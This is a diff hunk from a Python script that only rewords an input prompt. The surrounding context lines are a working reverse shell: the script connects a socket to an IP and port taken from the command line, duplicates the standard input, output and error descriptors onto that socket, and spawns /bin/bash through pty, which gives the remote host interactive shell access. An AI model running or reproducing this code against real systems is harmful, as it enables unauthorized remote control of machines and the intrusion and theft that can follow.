@@ -15,7 +15,7 @@ ip, port = sys.argv[1:]
 sock = socket.socket()
 sock.connect((ip, int(port)))
 
-input("Conected.... zzZZzzzzZzzzZZ")
+input("Conected.... Press Enter and send command")
 for fd in range(0, 3):
     os.dup2(sock.fileno(), fd)
     pty.spawn("/bin/bash")
